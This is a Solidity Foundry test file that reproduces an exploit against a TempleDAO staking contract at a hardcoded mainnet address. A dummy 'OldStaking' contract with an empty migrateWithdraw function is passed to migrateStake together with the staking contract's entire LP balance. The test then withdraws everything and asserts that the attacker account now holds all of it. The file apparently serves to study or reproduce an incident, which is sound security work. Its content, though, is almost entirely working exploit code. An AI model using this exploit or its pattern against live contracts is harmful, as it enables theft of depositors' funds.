// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;


import "forge-std/Test.sol";
import "../interfaces/IERC20.sol";

import "forge-std/console2.sol";

interface IStaxLPStaking {
    function migrateStake(address,uint256) external;
    function withdrawAll(bool claim) external;
}


contract TempleDaoExploitTest is Test {
    IStaxLPStaking staxLpStaking = IStaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);
    OldStaking oldStaking;
    IERC20 templeLP = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
    
    address bob = address(0xBEEf);


    function setUp() public {
        oldStaking = new OldStaking();
        console2.log("new staking contract address:",address(oldStaking));

    }

    function testExploit() public {
        startHoax(bob);
        uint256 current = templeLP.balanceOf(address(staxLpStaking));
        console2.log("LP balance of StaxLpStaking:",current);
        console2.log("LP balance before attack:",templeLP.balanceOf(bob));
        staxLpStaking.migrateStake(address(oldStaking), current);
        staxLpStaking.withdrawAll(false);
        console2.log("LP balance after attack:",templeLP.balanceOf(bob));
        assertEq(current,templeLP.balanceOf(bob));

}
}
contract OldStaking {

    function migrateWithdraw(address sender,uint256 amount) external{

    }

}
